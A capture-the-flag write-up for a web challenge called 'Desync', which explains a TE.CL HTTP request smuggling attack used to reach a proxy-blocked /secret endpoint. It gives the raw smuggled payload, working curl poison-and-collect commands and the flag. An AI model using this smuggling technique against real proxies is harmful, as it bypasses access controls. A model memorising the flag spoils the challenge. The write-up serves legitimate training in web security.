# Desync

Type: Web

Target: `http://chall-cd6a24c7.evt-209.labs-for-vishwa.ctf7.com/`

Flag: `VishwaCTF{t3_cl_smuggl3d_my_w4y_p4st_th3_w4f_b8d1b6f5}`

## Summary

The challenge is a request smuggling bug. The frontend blocks direct access to `/secret`, but the backend can still be tricked into processing it by abusing a `Transfer-Encoding` and `Content-Length` disagreement.

Direct recon showed:

- `GET /secret` returns `403 Forbidden`
- `POST /api/echo` reflects request bodies

That strongly suggests `/api/echo` is reachable through the proxy while `/secret` is only filtered at the gatekeeper layer.

## Vulnerability

The working payload uses both:

- `Transfer-Encoding: chunked`
- `Content-Length: 44`

with a body that starts as a valid chunked message and then appends a second request:

```http
1\r\n
Z\r\n
0\r\n
\r\n
GET /secret HTTP/1.1\r\n
Host: chall-cd6a24c7.evt-209.labs-for-vishwa.ctf7.com\r\n
Connection: close\r\n
\r\n
```

This is a TE.CL desync:

- the frontend trusts `Transfer-Encoding`
- the backend trusts `Content-Length`

The malformed request poisons a reused backend connection. A follow-up normal request then receives the backend response for the smuggled `GET /secret`.

Because the exploit depends on which backend connection the proxy reuses, it is normal to need a few attempts before the flag response is attached to your own request.

The flag itself confirms the bug class: `t3_cl`.

## Exploit

First send the poison request:

```bash
body=$'1\r\nZ\r\n0\r\n\r\nGET /secret HTTP/1.1\r\nHost: chall-cd6a24c7.evt-209.labs-for-vishwa.ctf7.com\r\nConnection: close\r\n\r\n'

curl -sS --http1.1 --raw \
  -H 'Connection: keep-alive' \
  -H 'Content-Length: 44' \
  -H 'Transfer-Encoding: chunked' \
  --data-binary "$body" \
  --max-time 8 \
  http://chall-cd6a24c7.evt-209.labs-for-vishwa.ctf7.com/api/echo >/dev/null
```

Then send a normal request to collect the orphaned response:

```bash
curl -sS -i --http1.1 -X POST \
  --data-binary 'x' \
  http://chall-cd6a24c7.evt-209.labs-for-vishwa.ctf7.com/api/echo
```

Response:

```http
HTTP/1.1 200 OK
Content-Length: 54
Content-Type: text/plain

VishwaCTF{t3_cl_smuggl3d_my_w4y_p4st_th3_w4f_b8d1b6f5}
```

If the normal request only returns a regular echo response, repeat the poison-and-collect cycle a few times.

## Files

- `solve.sh`: minimal reproducer that prints the flag
- `writeup.md`: this writeup
